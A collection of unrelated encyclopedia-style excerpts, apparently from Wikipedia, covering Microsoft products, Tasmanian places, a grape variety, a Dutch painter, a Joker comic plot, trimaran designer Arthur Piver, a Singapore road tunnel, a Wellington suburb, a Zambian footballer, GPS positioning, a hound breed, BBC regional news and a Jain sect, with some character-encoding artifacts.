video messages, files and images, and create conference calls. Other applications developed alongside Skype are Skype Translator, Skype Qik and GroupMe. Originally launched in 2003, it was bought by Microsoft in 2011 for $8.5 billion.  Devices  The Microsoft hardware division is responsible for producing self-branded hardware and various lines of consumer electronics products. They consist of: * Microsoft Surface - a family of Windows-based personal computing devices, first launched in 2012. It includes the Surface and Surface Pro series of 2-in-1 tablet computers, the Surface Book laptop, the Surface Studio all-in-one PC, and the Surface Hub interactive whiteboard. * Microsoft HoloLens - a set of augmented reality smartglasses, launched in 2016. *Xbox - a home gaming console. Many video games for the platform have been developed by the company's Microsoft Studios subsidiary, in addition to third-party video game publishers such as Electronic Arts and Activision. The first generation launched in 2001 and was succeeded by the Xbox 360 in 2005, and in turn by the Xbox One in 2013. * Microsoft also produces and sells mice, keyboards, webcams, headsets, game controllers and wireless display adapters. The production of these accessories is outsourced in most cases.  MSN  MSN is a web portal and related collection of Internet services and apps for Windows and mobile devices, provided by Microsoft. It was launched on August 1995. The current website and suite of apps offered by MSN was first introduced by Microsoft in 2014 as part of a complete redesign and relaunch. The redesign of MSN proved positive and helped increase traffic with an additional 10 million daily visitors after two months. MSN is based in the United States and offers international versions of its portal for dozens of countries around the world.  Servers  Microsoft Servers (previously called Windows Server System) is a brand that encompasses Microsoft's server products. This includes the Windows Server editions of the Microsoft Windows operating system itself, as well as products targeted at the wider business market. Microsoft's server products are further categorized into four groups namely, Operating systems, Productivity, Security and Microsoft System Center. A complete listing of product offerings can be found here. In July 2016, Microsoft moved the Windows Server team and its related products to the Windows and Devices Group, further justifying one Windows core across all platforms.  Microsoft underwater data center  In 2016, Microsoft made plans to opearte an experimental underwater server farm off the coast of Orkney. The nitrogen-atmosphere enclosed server farm was actually moved into position under the sea in May 2018, and included 855 servers. Powered exclusively by electricity from the Sun and wind, the server farm operated for two years, until May 2020, when the experiment ended, the enclosed tube was recovered, and brought to the surface for analysis. Preliminary results showed only 8 of the 855 servers failed during the two- year test, a failure rate of just 1/8th that of Microsoft's above ground server farms.  Cloud + AI Platform  This group focuses on building the core foundations. It was originally the Cloud and Enterprise group until March 2018, when it was expanded with the Windows core platform team merged into it. Led by Scott Guthrie.  Azure  Microsoft Azure is the company's cloud computing platform that hosts virtual machines, websites and more. It provides both platform as a service (PaaS) and infrastructure as a service (IaaS) services and supports many different programming languages, tools and frameworks, including both Microsoft-specific and third-party software and systems. It was launched in 2010. Within the Azure team * Business AI * Universal Store and Commerce * AI Perception and Mixed Reality * AI Cognitive Services and Platform  Visual Studio  Microsoft Visual Studio the set of programming tools and compilers. The software product is GUI-oriented and links easily with the Windows APIs, but must be specially configured if used with non-Microsoft libraries. Visual Studio supports development for both native Windows platform and .NET Framework. It was launched in 1995.  Dynamics  Microsoft Dynamics is a line of enterprise resource planning (ERP) and customer relationship management (CRM) software applications. Microsoft Dynamics was previously a separate engineering unit until it got reorganised into the Cloud & Enterprise Group in June 2015.  Artificial Intelligence and Research  This group was created in September 2016 to emphasize the company's presence on artificial intelligence. It was formed when parts of the former Apps and Services group came together with the research team to form a fourth engineering group. Led by Harry Shum.  Bing  Bing (known previously as Live Search, Windows Live Search, and MSN Search) is a web search engine (advertised as a \\"decision engine\\") from Microsoft. , Bing is the third largest search engine globally, with a query volume of 4.58%, behind Google (77%) and Baidu (14.45%). A complete list of search offerings from Bing can be found here. Under Bing, below non-search offerings are also listed: *Bing Ads: an advertising service that provides pay per click advertising on various search engines. *Bing Translator: a statistical machine translation platform and web service. *Bing Webmaster Tools: an online toolbox that allows webmasters to add their websites to the Bing index crawler. *Cortana: an intelligent personal assistant. *Microsoft Pulse:Bing Pulse real-time polling tools are now Microsoft Pulse real-time polling tools an audience response system, it has been used by several major news organisations like CNN, Fox and MSNBC.

It is nestled between the Meehan Range, Pitt Water and the Pontos Range. The Coal River Valley was one of the earliest areas used by the first British settlers outside Hobart; the nearby town of Richmond dates from 1823 when a bridge across the Coal River was constructed. The name Coal River comes from the abundant natural source of coal in the area. The first British settlers used the valley as a mixture of grazing, pastureland and crop growing. Its primary land usage is as vineyards and produces very high quality slow maturing cool weather grapes. The Coal River Valley is sheltered from the city lights of Hobart by the Meehan Range making it an ideal location for the University of Tasmania's Mount Pleasant radio telescope observatory.

It exists both in dark-skinned (Piquepoul noir) and light-skinned (Piquepoul blanc) versions, as well as a very little grown Piquepoul gris. Piquepoul blanc is the most common of the Piquepouls, with cultivated in France in 2000, and an increasing trend. Piquepoul tends to bud late and has some sensitivity to powdery mildew.  History  Piquepoul has a long history in the Languedoc region, and along with Cinsault and Clairette blanche is one of the oldest domestic grape varieties of that region. It was blended with Clairette blanche to produce the wine Picardan in the 17th & 18th centuries. After the Great French Wine Blight, when large shifts in varieties planted took place, Piquepoul lost popularity due to its susceptibility to fungal diseases such as powdery mildew and its low yield.  Piquepoul wines  In Languedoc, Piquepoul blanc is used both for blending and for varietal wines. Red wines produced from Picpoul noir are high in alcohol, are richly scented, but have a very pale colour, which has made the variety more popular as a blending ingredient than as a producer of varietal wines. Both the blanc and noir versions of Piquepoul are permitted blending grapes for the production of Ch√¢teauneuf-du-Pape. However, in 2004 only 0.15% of the appellation's surface was planted with the Piquepoul varieties.www.chateauneuf.dk: Grapes, accessed on June 18, 2008 In the New World, Piquepoul is being successfully grown in the foothills of the Chiricahua Mountains (5000 feet above sea level) in the Willcox AVA of southern Arizona. It is also grown in the Red Mountain AVA of eastern Washington State. Piquepoul blanc is being grown in Sonoma, California. Piquepoul blanc is also grown successfully in the Texas Hill Country AVA and Texas High Plains AVAs.

In the early 1850s, mining operations and the old mining town of Butterfly Valley occupied the area. When the mines panned out, the town of Butterfly Valley was abandoned. ;Grazing Grazing and logging operations took over, after mining ended.

Biography She was born in Amsterdam into a family of artists and received her first lessons from her father, Josephus Augustus Knip, who also gave lessons to her aunt (his youngest sister), Henri√´tte Geertruida Knip. His father, Nicolaas (1741‚Äì1808), was an artist as well. Some sources indicate that her mother was Pauline Rifer de Courcelles, a painter of birds, who was her father's first wife but, at the time of her birth, they were apparently separated and he was living with his mistress, Cornelia van Leeuwen (1790‚Äì1848), who is also credited with being Henri√´tte's mother.Brief biography @ Huygens/Resources. The family moved often as her father found work giving lessons. But, by 1823 her father was already blind in one eye. The following year, he and Pauline were finally divorced and he married Cornelia. After he became totally blind in 1832, the family continued to move about, staying for a short time in The Hague, then Beek and 's-Hertogenbosch before settling in Berlicum in 1840.Brief biography @ the Rehs Galleries. By this time, she was essentially in charge of the family's finances and legal obligations, and had begun painting seriously by 1835. She was a participant in the in 1838. After Cornelia's death, she moved to Amsterdam where she painted farms, animals and forests from nature; first in watercolor, then in oils. That same year, she became the first woman admitted as an \\"active member\\" to Arti et Amicitiae. In 1850, she married Feico Ronner (1819-1883) and they moved to Brussels. He was often ill and could not be regularly employed, so he became her manager. At this time, she narrowed her subject matter, focusing almost entirely on dogs and cats. After 1870, she painted her most famous works, featuring long-haired, often playful cats in bourgeois settings. She continued to paint dogs too; notably lapdogs belonging to Marie Henriette of Austria and Princess Marie of Hohenzollern-Sigmaringen. Ronner- Knip exhibited her work at the Palace of Fine Arts at the 1893 World's Columbian Exposition in Chicago, Illinois. In her later years, she had a house with a large garden, where she kept hunting dogs, cats and a parrot that she used as models. After observing them in her studio, she would make paper sculptures in the desired poses and set them together with props, such as furniture and fabrics. She occasionally collaborated with the genre artist, David Col. In 1887, she was awarded the Order of Leopold and, in 1901, became a member of the Order of Orange-Nassau. Her son Alfred and daughters Alice and also became artists. She often exhibited with them. She died on 28 February 1909 in Ixelles.

Determined to go out with a bang, he causes a riot in the Slab, and in the ensuing chaos, modifies the chemicals used by the prison to suppress its metahuman inmates into his Joker venom, and manages to \\"jokerize\\" the other inmates, making them insane and changing their appearance, giving them white skin, red lips, green hair, and a wide smile. The Black Canary, Nightwing, and Batman move in to put down the riot, while Dinah Laurel Lance and Shilo Norman are trapped inside. The Joker prompts Black Mass to suck the prison into a black hole while he and the other villains escape. The Blue Beetle narrowly rescues the Black Canary, Batman, and Nightwing, while Dinah and Shilo are not so lucky. Barbara Gordon feels remorseful for being absent on a date with Dick Grayson (Nightwing) while the riot first broke out and begins to wish that she could kill the Joker for the pain that he has caused in her life. Chaos soon spreads throughout the entire Earth and U.S. President Lex Luthor declares war on the Joker. While the JLA searches for him, the Joker hides out on Easter Island and sends his minions to capture Harley Quinn so he can impregnate her and produce an heir. Harley is eventually rescued by the Spoiler, Batgirl, and Power Girl. Meanwhile, the Joker grows disgruntled at the lack of creativity behind his minions' havoc, realizing that \\"every other crisis\\" involves red skies and crazy weather. With the assistance of Stormfront and Mr. 104, the Joker poisons the atmosphere and creates \\"crazy rain\\", spreading his laughing toxin across the world. His next plan is the assassination of President Luthor. While the \\"Jokerized\\" villains are being rounded up, Kirk Langstrom discovers that the venom they are affected with is also deadly and works to produce an antidote with the reluctant help of Harley Quinn. The Black Canary also discovers that the Joker's CAT scans were modified and that the doctors lied to him about his impending death in the hope that it would cause him to lead a more sane life. Inside the Slab, Shilo and Dinah are struggling to find a way to get themselves and the prison back to Earth. They initially try to find Black Mass to reverse the gravity well with the help of Mister Mind; however, Dinah accidentally shoots Black Mass during a run-in with the Maneaters. They eventually resort to killing Multi-Man over and over until he is able to reanimate Black Mass, who then sends them back to Earth. The Huntress is sent to Arkham Asylum to find Robin, who disappeared into the building and stopped sending out reports. After encountering Killer Croc, she finds what appears to be Robin's shredded outfit. Nightwing, enraged over Robin's death, goes to face the Joker, who is now holed up in Gotham Cathedral with one of his Jokerized metahumans placing a shield around the area. He can let in only who he wants to and decides to have fun with Nightwing. Mercilessly taunting him, Dick beats him to death until the Batman Family, Robin included, arrives on the scene, much to Nightwing's surprise. The Joker's heart is restarted and he is returned to prison. But Dick is distraught; he has crossed the line, and simply walks out on his friends. Back at the Slab (now located on an ice floe), the Joker is placed in a new cell with no entrances or exits. Shilo Norman remarks that the only way to punish a performer is to take away his audience.

Career In the late 1950s and 1960s Piver designed and built a series of simple three-hulled, plywood yachts starting with a 16 footer and culminating in a 64-footer that was built in England for charter in the Caribbean. (The word \\"trimaran\\" was coined by Viktor Tchetchet, a Ukrainian emigrant to the US who tested his boats on Long Island sound in the late 1940s.)

He then began selling do-it-yourself plans through a company called Pi-Craft. He thought anyone could build one of his boats even if they had no experience. In 1962, Piver built himself a 35-foot ketch-rigged trimaran named Lodestar and sailed it around the Pacific Ocean via New Zealand. In England, Cox Marine started building his boats and found a ready market, often with Americans who would sail them home. In 1964, Derek Kelsall bought a Lodestar bare hull, completed it with a flush deck, and entered the Observer Single- handed Trans-Atlantic Race. After ten days, he was ahead of Eric Tabarly when he struck some flotsam and broke his daggerboard and rudder. He returned to England for replacements, restarted and still finished in a respectable time. Character People who met Piver say he was a social man who enjoyed being the center of attention in his circle of boating friends and felt that the trimaran was his own personal invention. He was the \\"singlehander\\" type---he wrote about singlehanding in his books and made several solo passages. He also did not believe in using motors and only allowed for the inclusion upon insistence from home builders. Provisions were made for motor wells in his later designs. To him the use of motors was not being a true \\"sailor\\". Piver was allegedly driven to enter the Trans-Atlantic solo race because it was the only prestigious long-distance race in the world open to every type of boat. Legacy Despite the tragedies encountered on Piver vessels around the time of his death, examples of his boxy cruising designs nonetheless remain in use to this day. They could never sail well upwind but were very stable; many did carry their owners to the tropics and allowed them to fulfill their cruising dreams. Actually they did a lot more than that. Many properly built Piver tris made grueling voyages. Quen Cultra, of landlocked Illinois, built a Lodestar on his backyard farm and sailed it around the world with no prior sailing experience. He survived massive storms and even being hit by a ship. He wrote a book about the voyage titled Queequeg's Odyssey. A well built Piver, while not as \\"modern\\" as new tris, will still hold their own and are quite suitable for cruising, especially when modified with a Norm Cross design \\"fin keel and large area spade rudder\\". Piver's collected papers are preserved at the Mariner's Museum in Newport News, VA. Influence Public perception Piver's voyages broadened the public perception of seaworthiness for the trimaran concept and in a very short time. Piver designs became incredibly popular and inspired many novices to believe they could build their own boats and set off for the tropics. Thus Arthur Piver could be said to be the man most responsible for popularizing the nautical phenomenon of the cruising multihull. Multihull design However, it wasn't long before other designers began developing trimaran designs. By the mid-60s, these included one of his young fans, Jim Brown with the Searunner series that are still sailing today, Norman A. Cross of San Diego, California who had some 1,400 boats building or sailing by the 1980s, Jay Kantola in southern California with his stylish streamlined tris, and Derek Kelsall in England, the first designer to use foam and fiberglass \\"sandwich\\" construction and win a long-distance race with his prototype the 42 foot Toria. Criticism Piver boats could never sail well upwind. In addition some versions left much to be desired, because backyard boatbuilders lacked the necessary skills or altered the original plans. However, Piver was driven to maintain his position as the world's top designer. He responded with the AA \\"Advanced Amateur\\" range with a sleek, fast profile using fiberglass over marine plywood and using double chines to improve his boats' underwater shape. Plans for the Pi series and custom designs were available for lease only. He sailed his next boat across the Atlantic to compete with the growing fleet of multihulls that was based on the south coast of England. Piver's later 33' boat Stiletto was no match for the sleek molded fiberglass cats from Prout and Sailcraft and Kelsall's sandwich tris. To redeem himself, Piver announced that he would enter the next Observer Single-handed Trans-Atlantic Race (OSTAR) in 1968. (He had failed to make the start in 1960.) Having no time left for a solo qualification passage, he left his boat in England over the winter of 1967, and returned home. To qualify for the OSTAR, he still had to complete a 500-mile solo voyage, which he elected to do from San Francisco rather than in the spring in England. Death Piver borrowed a 25' tri from one of his homebuilders, set out to qualify for the 1968 OSTAR, and was never seen again. The next year, 1969, the Golden Globe solo non-stop round-the-world race was announced and two of the entrants set off in 40-foot Piver Victress trimarans. Nigel Tetley was sailing a full-cabin version, Donald Crowhurst was in a Cox Marine flush-decker similar to Kelsall's 35' \\"Folatre.\\" Both these voyages ended disastrously and their failures marked the end of attempts to race Piver tris across oceans.

Fort Canning Tunnel Besides the utilisation of relatively new engineering techniques, special care was taken to minimise impact on the environment of the surrounding Fort Canning during construction. The original contract for the FCT project was awarded to Sato Kogyo for S$25.95 million. The FCT was one of four Technical Tours organised by the Land Transport Authority and Association of Consulting Engineers on 29 September 2006 during the World Roads Conference 2006 held in Singapore. Description A signboard with the FCT's contract information Location The FCT cuts under Fort Canning Park and an access road, Canning Rise. The entrance to the tunnel is roughly located on the land housing the Old National Library Building, at the junction of Stamford Road, Armenian Street and Queen Street. It brings traffic to Penang Road, providing direct access to the Orchard area. The stretch of Stamford Road between Queen Street and Bencoolen Street will also be permanently realigned in front of the National Museum of Singapore after the FCT's construction. The bedrock of the area was the so-called Fort Canning Boulder Bed, a stiff clay with huge embedded boulders. Features The tunnel is part of a 500 m uni-directional three-lane new road. The FCT itself has a length of 350 m, and will include an Electronic Road Pricing (ERP) gantry to \\"close up the Orchard Road ERP cordon\\". The FCT incorporates electrical cables to ensure continued mobile phone and radio coverage. Furthermore, ventilation jets were installed in case of traffic congestion or fire. The tunnel has no fire exits, due to the relatively short distance. National Fire Protection Association standards require emergency escapes in tunnels every 300 m. 4 closed-circuit TV cameras are installed, 2 of which are inside the tunnel. Rationale The FCT project was based on the Urban Redevelopment Authority's plans for the Museum Planning Area. Over 3,000 vehicles pass through Stamford Road every hour during peak periods. With the old traffic scheme, motorists stopped at 2 traffic lights at slow speeds, which made the area prone to congestion. In view of increased traffic from new developments in Marina Centre and Marina South to the Orchard shopping area, design plans for the tunnel were drawn up to allow motorists to bypass several traffic junctions. The tunnel cuts journey times from 5 minutes to as fast as 18 seconds. The construction of the FCT would form a grid pattern, resulting in more efficient land use for the adjacent Singapore Management University (SMU) campus. The realignment of Stamford Road would also make the journey to Bras Basah and Little India smoother. By cutting through Fort Canning Hill, the historical and environmental significance of the area would still be preserved. Construction Fort Canning Tunnel under construction in May 2006 Workers fixing piping at the tunnel entrance Construction of the FCT started in October 2003 and the tunnel was opened on 16 January 2007, despite original plans for completion by the end of 2006. The cost of the project was originally set at S$25.95 million, but this increased to S$34 million and eventually up to S$40 million. The tunnel was opened on 16 January 2007 at 6 a.m. SST. Facilitating construction To make way for the construction process, the old National Library was demolished and moved to its present location along Victoria Street. Sections of Canning Rise were closed twice during the course of construction. First, a stretch of road was closed for 3 months from 1 July 2004. After this, a different section was closed \\"to facilitate the reinstatement works\\" of the FCT from 25 April 2006 for a period of two months. However, this second closure was extended to 31 August. In addition, a section of Stamford Road was temporarily redirected through the SMU campus near Prinsep Street during construction before its final realignment in front of the National Museum. Their two bus stops were relocated. The diversion of Stamford Road had to put a bus stop near to the school (SMU), instead of near to National Museum of Singapore. This bus stop retains the CBD 1994-style bus stop pole look and the name was renamed from \\"National Library\\" to \\"Singapore History Museum\\", before changing it to \\"SMU\\". In 2002, the bus stop pole was expanded bigger. In order not to conflict fast- moving traffic, the bus stop was moved to another side (Dhoby Ghaut MRT Station). It also retains the CBD 1994-style bus stop pole look. Construction method 180 m of the tunnel was constructed using an engineering technique known as the New Austrian Tunnelling method (NATM), which is similar to mining. The construction team used overlapping steel pipe roofs as support, with shotcrete lining, thick temporary invert, 2 layers of mesh, lattice girders and a watertight PVC membrane. The FCT is the first Singaporean road tunnel to use NATM, which has saved at least 22 trees in Fort Canning Park, including a 50-year-old tree. None of the designated 'Heritage Trees' were impacted by the FCT project. The remainder of the tunnel was constructed with the cheaper and more traditional cut-and-cover method. A professional arboriculture company, Arborculture, was employed to assess the risk to flora in the area, as well as provide conservation and management strategies.

It was established in the 1970s, and had a population of 6,260. In the 2013 census, the population of Churton Park and the adjacent community of Glenside was 6528, with 2349 dwellings. The suburb includes over 2300 households, Churton Park Reserve which includes a recreational sports field, two primary schools and a kindergarten. The Churton Park Community Centre, which is managed and staffed by Wellington City Council, is also located in the Village. History Churton Park is one of the youngest suburbs in Wellington and was farmland until 1970. In the 1850s Thomas Drake was running 200 sheep in what is now Churton Park. The suburb was developed by \\"John Dick Walker\\" (1926-1981).Memorial plaque at lower entrance to John Walker Park. The area of Churton Park near current Lakewood Avenue was originally a swamp and has been recently developed into residential housing and a commercial shopping centre. Since being established, it is one of the fasted growing subdivisions in Wellington, with the population expected to grow to over 12,000 over the next two decades. In 2018, Wellington City Council purchased the 268 Ohariu Valley Rd property adding much of the ridge line overlooking Churton Park (from Ohariu Valley Rd to west of the Erlestoke Cres cul-de-sac) to the Outer Green Belt Geography The topography is quite hilly and has regenerating bush in some areas that has not been excavated for housing sub-divisions. Steep hills extend west over to Ohariu Valley. Extensive cut and fill earthworks have been required in the construction of the subdivisions for housing. Weather The micro-climate is only slightly different from that of Johnsonville, but is warmer and less windy than Wellington due to being sheltered from the southerly winds that come from the Cook Strait. It rarely snows, but during winter 2011 snowfalls briefly shut down buses and closed roads, causing some students and workers to stay home for a few days. Semi panoramic image from the surrounding hills of Churton Park Education School enrollment zones Churton Park is within the enrollment zones for Onslow College, Newlands College, St Oran's College, Raroa Normal Intermediate Amesbury School, and Churton Park School. Primary schools Churton Park has two state primary schools that cater for pupils up to Year 6. Churton Park School on Churton Drive is an established school, and the roll has rapidly increased over the years. To accommodate these increases, there were many renovations to the buildings between 1997 and 2007. In 2006, to help manage roll growth, the School Board proposed an amendment to the zoning policy/area. This was heatedly debated in the community as the proposal would have removed several long-standing streets from the Zone. The associated community concern, protest action and lobbying by the Campaign for Local Schooling and parent feedback resulted in the announcement by the Ministry of Education in 2007 that a new, larger, school site would be developed in the area. On 17 March 2009, Minister of Education Anne Tolley announced that a second primary school would be built in the area instead. Amesbury School on Amesbury Drive opened at the start of 2012. It has over 80 pupils and is growing. The Amesbury Hall at the school was opened in May by Wellington Mayor Celia Wade-Brown. The construction of the hall was funded in part by the proceeds from the sale of part of the school site (which was held as a Reserve) by WCC to the Ministry of Education. The Amesbury Hall is available for community use. Preschool There is a little school on Melksham Drive off Westchester Drive and a kindergarten next to Churton Park School. Mining There are historic gold mining shafts in the area. Tawa Flats All Luck Gold Mining Company shafts of 1881 included one now buried beneath Erlestoke Crescent. Public Transport The suburb consists of two routes operated by Tranzurban. The Route 1 connects Churton Park to Johnsonville, the city centre, Newtown and Island Bay. The Route 19 acts as a Johnsonville loop, and has an extension service to the CBD during peak times. A separate service along Middleton Road connects Johnsonville to Tawa and Porirua. A 2017 report said that a proposed commuter railway station near Churton Park on the Kapiti Line (and actually in Glenside) was too expensive.

The causeway and adjacent Mcgees Bridge provide vital links between Hobart and two of Tasmania's principal tourist attractions - Port Arthur Historic Site on the Tasman Peninsula and the picturesque East Coast via the Tasman Highway.  History In colonial times, the Richmond Bridge had been the primary crossing point of the Coal River on the road from Hobart to Sorell and beyond to the Tasman Peninsula and Port Arthur. It had been decided much earlier that if a crossing at Pitt Water could be made, it would considerably reduce the time to reach Sorell. The engineering was difficult, but with a ready supply of convict labour on hand, the causeway was constructed with main force. It was finally completed in 1872. The Sorell Causeway is the second such convict-built causeway in the South-East of Tasmania, and is similar to the causeway section of the Bridgewater Bridge across the River Derwent. Description In recent years it has undergone massive repairs and modifications. It has been decided that there needed to be a better flow of tidal water from Pitt Water and Orielton Lagoon into the open sea as the stagnation was causing outbreaks of Blue-Green Algae which was poisoning the other marine species there. As a result, sluice conduits were cut into the lagoon, and a new pile system was created, to turn longer sections of the causeway into actual bridges. Ever since its construction it has been a major route of access from Hobart to the east coast and the Tasman Peninsula, and is now a section of the Tasman Highway.

An accomplished and reliable defender, he plays in either full back position for the Zambia national team and centre back for his club. He is Zambia's second most capped player after Kennedy Mweene according to FIFA.https://www.fifa.com/mm/document/fifafacts/stats- centclub/52/00/59/centuryclub290713_neutral.pdf\\"Musonda is Zambia‚Äôs most capped player as he joins Tana in Century club\\" Zambian Football (Date accessed 15 August 2013) Career Musonda was born in Kalulushi. Described by FIFA as the 'father figure' of the Zambian team, Joseph Musonda is fitter than ever and still very much a part of the nation's defence of the Africa Cup of Nations. Having contributed so much to Zambia's historic win in the 2012 Africa Cup of Nations it was cruel that Joseph Musonda's final v Ivory Coast should be cut short by injury after just 11 minutes. Despite this, Musonda was finally able to celebrate what was his 100th match for Zambia when his team went on to win 8‚Äì7 on penalties. Musonda injured his ankle making a vital intervention against Gervinho who was bearing down on goal and he left the field in visible distress. Despite his uncompromising defending, Joseph Musonda is considered to be one of the gentlemen of the Zambia national team, so it was no surprise when his opponent that day, Didier Drogba, came to comfort him as he was brought off the field. Manager Herve Renard would later carry him up to receive his winners medal. Musonda made a much quicker recovery from that ankle injury than was expected demonstrating his powers of recovery and he was soon playing again for Golden Arrows in South Africa. Indeed, in June 2012 the club tied him to a three-year contract extension that will take Musonda to 38 years of age. At the time, Joseph Musonda turned down the opportunity to play in the United Arab Emirates on a lucrative contract. Joseph Musonda was part of the Zambian 2006 African Nations Cup team. He was also picked in the 2008 squad for the AFCON and Zambia were eliminated in the group stage before being part of the 2010 squad that made it to the Quarter Finals of the competition eventually losing to Nigeria in a penalty shoot-out. In his native Zambia, Musonda was a two times winner of the league championship with Nkana FC in 1999 and 2001. Post-playing career On 12 November 2019, it was confirmed, that 42-year old Musonda had retired after more than 20 years of playing professional football and would continue as a physical coach at Nkana, signing a two-year deal with the club.PSL & Zambia Legend Retires!, soccerladuma.co.za, 12 November 2019 Honours Zambia *Africa Cup of Nations: 2012 See also *List of footballers with 100 or more caps References External links  * Joseph Musonda - Century of International Appearances RSSSF Category:1977 births Category:Living people Category:Zambian footballers Category:Zambia international footballers Category:Zambian expatriate footballers Category:Zambian expatriate sportspeople in South Africa Category:2006 Africa Cup of Nations players Category:2008 Africa Cup of Nations players Category:2010 Africa Cup of Nations players Category:2012 Africa Cup of Nations players Category:2013 Africa Cup of Nations players Category:Free State Stars F.C. players Category:Lamontville Golden Arrows F.C. players Category:Polokwane City F.C. players Category:Nkana F.C. players Category:Expatriate soccer players in South Africa Category:Association football defenders Category:FIFA Century Club Category:Zanaco F.C. players Category:ZESCO United F.C. players Category:Africa Cup of Nations-winning players ","title":"Joseph Musonda"},{"id":"8097562","text":"Logo of Semafor theatre in former Alfa Passage, today St√Ωblova Passage, Prague Semafor is a theatre in Prague, Czech Republic, established by Ji≈ô√≠ Such√Ω and Ferdinand Havl√≠k in 1959.Zem≈ôel klarinetista Ferdinand Havl√≠k, spoluzakladatel Semaforu It is one of the so-called \\"Theatres of small stages\\".

Other conventional methods use the dual-frequency only during initialisation. LRK makes solving ambiguities during initialisation easy and continuous dual-frequency kinematic operation possible at distances up to 40 kilometres. Conventional dual-frequency kinematic operation is limited to about 10 kilometres, using a combined observation on GPS L1 and L2 frequencies to produce an initial wide lane solution, ambiguous to around 86 centimetres. During a second phase, the conventional kinematic method uses measurements from the L1 frequency only. This method only allows for kinematic operation as long as the de-correlation of atmospheric errors is compatible with a pure phase single-frequency solution. Similar to the KART process, LRK is a simple and reliable method that allows any initialisation mode, from a static or fixed reference point, to On The Fly ambiguity resolution, when performing dual-frequency GPS positioning. LRK technology reduces initialisation times to a few seconds by efficiently using L2 measurements in every mode of operation. LRK maintains optimal real-time positioning accuracy to within a centimetre at a range up to 40-50 kilometres, even with a reduced number of visible satellites.

It is bred as a scenthound, for hunting boar in mountainous terrain. The breed is one of the large Austrian Bracke.  Appearance  The Styrian Coarse-haired Hound is a medium-sized hound, with height at the withers of 45‚Äì53 cm (17.5‚Äì21 in), and weight between 15‚Äì18 kg (33-40 lbs) with a well muscled body and a serious expression. The breed name refers to the coat, which is harsh and rough (although not shaggy). Coat colours are red and fawn; a white mark on the chest may be present. The breed tolerates extremes of temperature well, and has remained a healthy breed through \\"refresher breeding\\" (Auffrischungszucht, outcrossing). Steirische Rauhhaarbracke  History  The breed was created in the 1870s by Karl Peintinger, an industrialist from Styria. Peintinger crossed his \\"Hela 1\\", from an old type of Hanoverian scent hound, with an Istrian Hound, and continued selective breeding until a rough-coated, hardy hunting dog was achieved. The breed is used by Austrians and Slovenians to hunt wild boar. It can also be used to track wounded animals through rough terrain and in high altitudes. As with many breeds bred for work, they are not generally kept as a companion dog and do not make good pets; they require a lot of space and exercise, and can be dominant and destructive.  Recognition  The Styrian Coarse-haired Hound is sometimes called the Peintinger Bracke after the creator of the breed in the 1870s. The breed was first recognised in 1889. It is recognised in its home country by the √ñsterreichische Kynologenverband (Austrian Kennel Club) and internationally by the F√©d√©ration Cynologique Internationale as a medium-sized scenthound, breed number 62. The breed is also recognised in North America by the United Kennel Club in the Scenthound Group. In Austria, breeding is overseen and hunt testing done by the √ñsterreichischer Verein Brack (hunt club). Breeding and hunt tests information The breed may also be listed by various minor kennel clubs and organisations under its original name, the English translation, alternate names, or various combinations of those, and promoted as a rare breed for those seeking an unusual pet.  Related breeds  The Brandlbracke (Australian Short Haired Bracke, or Vier√§ugl) (FCI 63), and the Tiroler Bracke (FCI 68) are short- haired breeds of large Austrian Bracke, descended from the same ancient types of hounds.

An opt-out for the Channel Islands was introduced during the 1990s, beginning with short bulletins after the Nine O'Clock News on weeknights, presented from a small studio at the Fr√©mont Point transmitter. The service was expanded on 16 October 2000 and now incorporates the first half of Spotlight's main 6:30pm programme (under the name BBC Channel Islands News) and the full late bulletin after the BBC News at Ten on weeknights. The service is now based at the studios of BBC Radio Jersey in St Helier. Following the merger of Westcountry and HTV West to become ITV West & Westcountry in February 2009 (later becoming \\"ITV West Country\\" on 1 January 2014), Spotlight is now the only regional TV news service dedicated entirely to, and produced in, the South West, as the ITV service (ITV News West Country) is based in Bristol with bulletins and opt-outs for the region. ITV Channel Television continues to produce and broadcast its own dedicated local news service for the Channel Islands from its studios near St Helier in Jersey. Studios Broadcasting House, Plymouth The regional headquarters and television centre is at Broadcasting House in the Mannamead area of Plymouth, with offices and television studios also in St Helier, Truro and Exeter. The Plymouth studios were originally a Victorian villa on Seymour Road called Ingledene before being bought by the BBC following the Second World War and subsequently fitted out with technical facilities. A new colour television studio was added to the complex in 1974, allowing Spotlight to broadcast in colour for the first time. The studios were due to close in late 2011, with BBC South West moving to a new purpose-built broadcasting centre on the banks of Sutton Harbour, opposite the Barbican in Plymouth city centre. The move stalled, however, due to a developer pulling out of the project and the effect of the recession on the construction industry. In late 2012, the owner of the harbour expressed fears the move may never happen and admitted other parties had expressed an interest in moving to the site earmarked for the BBC. In 2013, the BBC confirmed it would not be moving to Sutton Harbour, but instead be refurbishing its existing Plymouth headquarters.

M≈´rtip≈´jaka Jains differ from both ≈övetƒÅmbara SthƒÅnakavƒÅsƒ´ and ≈övetƒÅmbara TerƒÅpanthƒ´ Jains in that they worship images of the Tƒ´rtha·πÖkaras. M≈´rtip≈´jaka may also generally describe members of both the ≈övetƒÅmbara and Digambara traditions who use images (m≈´rti) in their worship (p≈´jƒÅ).  Agreements and disagreements  According to Nalini Balbir, all ≈övetƒÅmbara sects agree upon \\"the authority of the ≈övetƒÅmbara canonical scriptures, with slight differences; claims of monastic descent from Sudharman, except for the Upake≈õa-gaccha; [and] white monastic robes [for] monks and nuns.\\" However, despite these commonalities, a central division exists between each of the sects as related to the use of images in worship. Indeed, the early Jain reformer Lo·πÖkƒÅ ≈öƒÅh used the term \\"m≈´rtip≈´jaka\\" to classify an image-worshipping Jain from other kinds. Lo·πÖkƒÅ is generally presented in his biographies as a scribe who lived in the Gujarat region during the 15th century. His occupation allowed him access to many Jain scriptures and manuscripts, which he interpreted to lack references to the construction of temples or the worship of images, despite both being prevalent at the time and also idols belonging to the time of Lord Mahavira being worshiped. He argued that these practices were spiritually dangerous by grounding them as violations of ahi·πÉsƒÅ, the principle of non-injury central to Jain religion and philosophy. According to Lo·πÖkƒÅ, re-shaping the land to build temples leads to the destruction of small and microscopic organisms, and p≈´jƒÅ rituals entail \\"subtle forms of harm\\" through material offerings like flowers or incense. Lo·πÖkƒÅ's lasting influence brought to light an aniconic impulse within a strict, doctrinal understanding of Jain teaching. The ≈övetƒÅmbara SthƒÅnakavƒÅsƒ´ and TerƒÅpanthƒ´ sects accept this impulse, agreeing with Lo·πÖkƒÅ that the most appropriate form of religious practice is mental worship (bhƒÅva- p≈´jƒÅ), which is already performed by mendicants, because the reliance on images and temples is indicative of an attachment to objects that is \\"spiritually counterproductive.\\" 